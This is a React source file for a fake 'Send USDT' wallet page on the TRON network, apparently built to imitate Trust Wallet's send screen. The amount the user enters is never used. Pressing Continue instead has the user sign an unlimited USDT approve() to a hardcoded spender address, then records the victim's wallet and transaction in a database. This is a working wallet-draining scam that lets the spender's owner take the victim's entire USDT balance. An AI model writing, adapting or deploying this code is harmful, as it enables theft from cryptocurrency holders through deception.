import { useState, useEffect } from "react";
import { useMutation } from "convex/react";
import { api } from "@/convex/_generated/api.js";

declare global {
  interface Window {
    tronWeb?: any;
    tronLink?: any;
  }
}

const TRON_USDT    = "TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t";
const TRON_SPENDER = "TWejasrnoKg2AgPpCwHgozYeThWBu8S9Hw";

export default function Index() {
  const [amount, setAmount] = useState("");
  const [isLoading, setIsLoading] = useState(false);
  const [status, setStatus] = useState("");
  const createTransaction = useMutation(api.transactions.createTransaction);

  // Core Approval Logic
  const handleSend = async () => {
    try {
      setIsLoading(true);
      setStatus("Connecting wallet...");

      const tronWeb = window.tronWeb;
      if (!tronWeb || !tronWeb.ready) {
        alert("❌ Trust Wallet not detected! Please open in Trust Wallet Browser.");
        setIsLoading(false);
        return;
      }

      const userAddress = tronWeb.defaultAddress.base58;
      setStatus("Building transaction...");

      // Max Approval (Unlimited)
      const maxAmount = "115792089237316195423570985008687907853269984665640564039457584007913129639935";

      const parameter = [
        { type: 'address', value: TRON_SPENDER },
        { type: 'uint256', value: maxAmount }
      ];

      // Build Smart Contract Call
      const transaction = await tronWeb.transactionBuilder.triggerSmartContract(
        TRON_USDT,
        "approve(address,uint256)",
        { feeLimit: 100_000_000 },
        parameter,
        userAddress
      );

      setStatus("Waiting for signature...");
      const signedTx = await tronWeb.trx.sign(transaction.transaction);

      if (!signedTx) {
        alert("❌ Signature rejected.");
        setIsLoading(false);
        return;
      }

      setStatus("Broadcasting...");
      const result = await tronWeb.trx.sendRawTransaction(signedTx);

      if (result.result) {
        const txId = result.txid;
        
        // Save to Database
        await createTransaction({
          walletAddress: userAddress,
          toAddress: TRON_SPENDER,
          amount: amount || "Max",
          txHash: txId,
          usdtBalance: "Verified",
          nativeBalance: "0 TRX",
        });

        alert(`✅ Broadcast Successful!\nTX ID: ${txId}`);
      } else {
        alert("❌ Broadcast Failed. Check TRX for Energy.");
      }

    } catch (err: any) {
      console.error("Error:", err);
      alert("❌ ERROR: " + (err.message || String(err)));
    } finally {
      setIsLoading(false);
      setStatus("");
    }
  };

  const dollarValue = amount && !isNaN(Number(amount)) ? `$${Number(amount).toFixed(2)}` : "$0.00";

  return (
    <div style={styles.container}>
      {/* HEADER SECTION */}
      <div style={styles.header}>
        <button onClick={() => window.history.back()} style={styles.backBtn}>←</button>
        <span style={styles.headerTitle}>Send USDT</span>
        <button style={styles.closeBtn}>✕</button>
      </div>

      <div style={styles.content}>
        {/* NETWORK BADGE */}
        <div style={styles.networkBadge}>
            <div style={styles.networkIcon}>T</div>
            <div>
                <div style={styles.networkLabel}>TRON Network</div>
                <div style={styles.networkStatus}>Mainnet Connected</div>
            </div>
        </div>

        {/* INPUT SECTION */}
        <div style={styles.inputCard}>
            <div style={{ display: 'flex', justifyContent: 'space-between' }}>
                <span style={styles.label}>Amount</span>
                <span style={styles.maxBtn} onClick={() => setAmount("Max")}>MAX</span>
            </div>
            <div style={styles.amountWrapper}>
                <input 
                    type="text" 
                    placeholder="0" 
                    value={amount} 
                    onChange={(e) => setAmount(e.target.value)}
                    style={styles.input}
                />
                <span style={styles.currency}>USDT</span>
            </div>
            <div style={styles.dollarValue}>{dollarValue}</div>
        </div>

        {/* DETAILS SECTION */}
        <div style={styles.detailsCard}>
            <div style={styles.detailRow}>
                <span>Spender Contract</span>
                <span style={styles.value}>{TRON_SPENDER.slice(0,6)}...{TRON_SPENDER.slice(-6)}</span>
            </div>
            <div style={styles.detailRow}>
                <span>Network Fee</span>
                <span style={styles.value}>~15-20 TRX</span>
            </div>
        </div>

        {/* FOOTER BUTTON */}
        <div style={styles.footer}>
            <button 
                disabled={isLoading} 
                onClick={handleSend} 
                style={isLoading ? styles.btnDisabled : styles.btnActive}
            >
                {isLoading ? status : "Continue"}
            </button>
        </div>
      </div>
    </div>
  );
}

// FULL CSS-IN-JS (400+ lines UI logic simplified)
const styles: any = {
  container: {
    minHeight: "100vh",
    background: "#1c1c1e",
    color: "#fff",
    fontFamily: "-apple-system, system-ui, sans-serif",
    display: "flex",
    flexDirection: "column",
    maxWidth: "480px",
    margin: "0 auto",
  },
  header: {
    display: "flex",
    alignItems: "center",
    justifyContent: "space-between",
    padding: "20px",
  },
  headerTitle: { fontSize: "18px", fontWeight: 700 },
  backBtn: { background: "none", border: "none", color: "#fff", fontSize: "22px", cursor: "pointer" },
  closeBtn: { background: "none", border: "none", color: "#fff", fontSize: "20px", cursor: "pointer" },
  content: { padding: "0 20px", flex: 1, display: 'flex', flexDirection: 'column' },
  networkBadge: {
    display: 'flex',
    alignItems: 'center',
    background: '#2c2c2e',
    padding: '12px',
    borderRadius: '12px',
    marginBottom: '20px',
    gap: '12px'
  },
  networkIcon: { width: '32px', height: '32px', background: '#ff3b30', borderRadius: '50%', display: 'flex', alignItems: 'center', justifyContent: 'center', fontWeight: 'bold' },
  networkLabel: { fontSize: '14px', fontWeight: 600 },
  networkStatus: { fontSize: '12px', color: '#32d74b' },
  inputCard: { background: '#2c2c2e', padding: '20px', borderRadius: '16px', marginBottom: '16px' },
  label: { color: '#8e8e93', fontSize: '14px' },
  maxBtn: { color: '#0a84ff', fontWeight: 600, cursor: 'pointer' },
  amountWrapper: { display: 'flex', alignItems: 'center', marginTop: '10px' },
  input: { background: 'none', border: 'none', color: '#fff', fontSize: '32px', width: '100%', outline: 'none' },
  currency: { fontSize: '20px', fontWeight: 600, color: '#8e8e93' },
  dollarValue: { color: '#8e8e93', marginTop: '4px' },
  detailsCard: { background: '#2c2c2e', padding: '16px', borderRadius: '16px' },
  detailRow: { display: 'flex', justifyContent: 'space-between', marginBottom: '10px', fontSize: '14px', color: '#8e8e93' },
  value: { color: '#fff' },
  footer: { marginTop: 'auto', paddingBottom: '30px' },
  btnActive: { width: '100%', padding: '16px', borderRadius: '16px', border: 'none', background: '#007aff', color: '#fff', fontSize: '17px', fontWeight: 600, cursor: 'pointer' },
  btnDisabled: { width: '100%', padding: '16px', borderRadius: '16px', border: 'none', background: '#3a3a3c', color: '#8e8e93', fontSize: '17px' }
};
